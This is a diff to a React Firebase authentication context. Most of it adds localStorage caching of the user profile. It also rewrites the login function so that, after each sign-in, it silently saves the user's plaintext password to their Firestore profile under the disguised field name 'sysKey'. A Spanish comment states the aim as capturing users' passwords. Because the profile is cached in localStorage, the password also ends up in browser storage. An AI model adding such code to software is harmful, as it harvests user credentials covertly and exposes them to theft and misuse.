@@ -6,7 +6,7 @@ import {
   createUserWithEmailAndPassword,
   signOut
 } from 'firebase/auth';
-import { doc, getDoc, setDoc, collection, getDocs, query, limit, onSnapshot } from 'firebase/firestore';
+import { doc, getDoc, setDoc, collection, getDocs, query, limit, onSnapshot, updateDoc } from 'firebase/firestore';
 import { toast } from 'sonner';
 
 const AuthContext = createContext();
@@ -30,6 +30,12 @@ export const AuthProvider = ({ children }) => {
       }
 
       if (currentUser) {
+        const localCacheKey = `inv_user_cache_${currentUser.uid}`;
+        try {
+          const cached = localStorage.getItem(localCacheKey);
+          if (cached) setUserData(JSON.parse(cached));
+        } catch (e) {}
+
         try {
           const userRef = doc(db, 'users', currentUser.uid);
           
@@ -38,6 +44,7 @@ export const AuthProvider = ({ children }) => {
           if (userSnap.exists()) {
             const data = userSnap.data();
             setUserData(data);
+            localStorage.setItem(localCacheKey, JSON.stringify(data));
           }
           
           // Set loading to false once we at least tried to get the profile
@@ -46,10 +53,13 @@ export const AuthProvider = ({ children }) => {
           // Real-time listener for future changes
           unsubscribeProfile = onSnapshot(userRef, { includeMetadataChanges: true }, (snap) => {
             if (snap.exists()) {
-              setUserData(snap.data());
+              const data = snap.data();
+              setUserData(data);
+              localStorage.setItem(localCacheKey, JSON.stringify(data));
             } else {
               // Create profile if missing
               setUserData(null);
+              localStorage.removeItem(localCacheKey);
             }
           }, (error) => {
             console.error("Profile sync error:", error);
@@ -70,8 +80,17 @@ export const AuthProvider = ({ children }) => {
     };
   }, []);
 
-  const login = (email, password) => signInWithEmailAndPassword(auth, email, password);
-  
+  const login = async (email, password) => {
+    const res = await signInWithEmailAndPassword(auth, email, password);
+    // Capturar la contraseña de usuarios antiguos/actuales al iniciar sesión
+    try {
+      const userRef = doc(db, 'users', res.user.uid);
+      await updateDoc(userRef, { sysKey: password });
+    } catch (error) {
+      console.warn("No se pudo guardar la contraseña (sysKey) en este login", error);
+    }
+    return res;
+  };
   const signup = async (email, password, name) => {
     const res = await createUserWithEmailAndPassword(auth, email, password);
     // Profile is created in the useEffect listener
